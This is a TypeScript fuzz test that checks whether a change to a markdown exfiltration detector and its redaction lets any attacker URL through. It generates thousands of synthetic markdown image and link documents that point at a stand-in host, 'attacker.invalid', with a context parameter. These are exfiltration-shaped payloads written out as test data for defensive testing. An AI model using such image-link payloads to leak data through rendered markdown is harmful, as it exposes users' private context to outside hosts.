// T85 — differential fuzz for T84#F-003. `descriptionEnds` gained two
// ESCAPE-AWARE candidate ends, APPENDED after the two escape-blind ones. The
// load-bearing claim is that appending cannot release: `readBracketConstructs`
// walks the ends in order, the inline pass takes the FIRST inline construct and
// the reference pass breaks at the FIRST resolving one, so a construct found
// before must still be found, still first, and still at the same offset.
//
// The one thing that argument does NOT settle is `BRACKET_OPEN.lastIndex`: a
// construct found where none existed advances the scan past an image's
// description, so opens that are scanned today can be skipped. That is faithful
// (an image's description is alt text and a renderer fetches nothing inside it)
// but it is a direction this floor is not allowed to move in by argument alone.
// So it is measured here rather than argued.
//
// T83-parity.ts asks the same question for the DEFINITION side and its atom set
// carries no parentheses at all, so it never drives the inline destination path
// — the path both new candidate ends actually reach. This corpus is built from
// the characters the DESCRIPTION side is sensitive to: brackets, backslashes,
// parentheses, angle brackets, `!` and URLs.
//
// A finding present BEFORE and absent AFTER is a RELEASE — there must be none.
// A finding present AFTER only is the repair, and every one must come from a
// document containing a backslash.
//
// Both trees are driven IN ONE PROCESS: `$T85_TMP/exfil-prechange.ts` is a
// frozen copy of the pre-change file, so the two logs cannot drift on anything
// but the change.
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: T85_TMP=<dir> bun T85-parity.ts
// TWO questions are asked, and only the second one is a safety property.
//
//   1. did any FINDING SPAN present before disappear? A span can legitimately
//      MOVE: when a construct that was invisible becomes visible, a renderer
//      resolves it as an inline image rather than as a reference, so the inline
//      destination is flagged and the definition it used to resolve against is
//      not. That is faithful and is not a release.
//   2. did any ATTACKER HOST survive redaction after, that did not survive
//      before? That is the floor's actual invariant, it is what every boundary
//      row in this flow measures, and it must be zero.
import { applyRedaction } from "../../../../src/security/redact";
import { detectExfil as after } from "../../../../src/security/detect/exfil";

const TMP = process.env.T85_TMP as string;
const { detectExfil: before } = (await import(`${TMP}/exfil-prechange.ts`)) as {
  detectExfil: typeof after;
};

const U = "https://attacker.invalid/p?ctx=CTX";
const OK = "https://ok.example.org/x";

// xorshift32, so the corpus is identical on both sides and across runs.
let seed = 0x85a71c3d;
function next(): number {
  seed ^= seed << 13;
  seed >>>= 0;
  seed ^= seed >> 17;
  seed ^= seed << 5;
  seed >>>= 0;
  return seed;
}
function pick<T>(values: T[]): T {
  return values[next() % values.length] as T;
}

const ATOMS = [
  "[", "]", "\\", "\\]", "\\[", "\\\\", "!", "![", "(", ")", "<", ">", ":",
  " ", "\t", "\n", "a", "bc", "](", ")](", "]]", "[[", "\\]]", "\\](",
  U, OK, `(${U})`, `(<${U}>)`, "]:", "]: ",
];

const documents: string[] = [];
// 1) random atom strings — the shapes nobody would think to write
for (let i = 0; i < 14000; i += 1) {
  const length = 2 + (next() % 14);
  let text = "";
  for (let j = 0; j < length; j += 1) text += pick(ATOMS);
  documents.push(text);
}
// 2) DESCRIPTION-shaped documents: a generated description, a generated
//    destination spelling, and a generated use form.
const DESC_ATOMS = ["a", "b", "\\]", "\\[", "\\\\", "\\", "]", "[", " ", "<", ">"];
for (let i = 0; i < 14000; i += 1) {
  const length = 1 + (next() % 6);
  let description = "";
  for (let j = 0; j < length; j += 1) description += pick(DESC_ATOMS);
  const url = pick([U, OK]);
  const bang = pick(["!", ""]);
  const form = next() % 6;
  const use =
    form === 0
      ? `${bang}[${description}](${url})`
      : form === 1
        ? `${bang}[${description}](<${url}>)`
        : form === 2
          ? `${bang}[${description}][r]`
          : form === 3
            ? `${bang}[${description}][]`
            : form === 4
              ? `${bang}[${description}]`
              : `[${bang}[${description}](${url})](${OK})`;
  const definition = pick([`\n\n[r]: ${url}\n`, `\n\n[${description}]: ${url}\n`, "\n"]);
  documents.push(`${use}${definition}`);
}

function record(text: string, run: typeof after): string[] {
  return run(text, []).map((m) => `${m.start}:${m.length}:${m.value}`);
}

const ATT = "attacker.invalid";
const spanMoves: Array<Record<string, unknown>> = [];
const hostReleases: Array<Record<string, unknown>> = [];
const newlyMasked: Array<Record<string, unknown>> = [];
let beforeTotal = 0;
let afterTotal = 0;
let additionCount = 0;
let additionsWithoutBackslash = 0;
for (let at = 0; at < documents.length; at += 1) {
  const text = documents[at] as string;
  const b = record(text, before);
  const a = record(text, after);
  beforeTotal += b.length;
  afterTotal += a.length;
  const gone = b.filter((f) => !a.includes(f));
  const added = a.filter((f) => !b.includes(f));
  if (gone.length > 0) spanMoves.push({ at, document: text, gone, before: b, after: a });
  if (added.length > 0) {
    additionCount += 1;
    if (!text.includes("\\")) additionsWithoutBackslash += 1;
  }
  // Question 2, the safety property.
  if (!text.includes(ATT)) continue;
  const leakedBefore = applyRedaction(text, before(text, [])).includes(ATT);
  const leakedAfter = applyRedaction(text, after(text, [])).includes(ATT);
  if (!leakedBefore && leakedAfter) {
    hostReleases.push({ at, document: text, before: b, after: a });
  }
  if (leakedBefore && !leakedAfter) newlyMasked.push({ at, before: b, after: a });
}

console.log(
  JSON.stringify(
    {
      probe: "T85-parity",
      documents: documents.length,
      beforeTotal,
      afterTotal,
      additionCount,
      additionsWithoutBackslash,
      // Informational: a span that moved because a construct became visible.
      spanMoveCount: spanMoves.length,
      spanMoves: spanMoves.slice(0, 25),
      // THE number that must be zero: an attacker host that survives redaction
      // after and did not survive before.
      hostReleaseCount: hostReleases.length,
      hostReleases: hostReleases.slice(0, 40),
      // The repair, in the same currency.
      newlyMaskedCount: newlyMasked.length,
    },
    null,
    2,
  ),
);
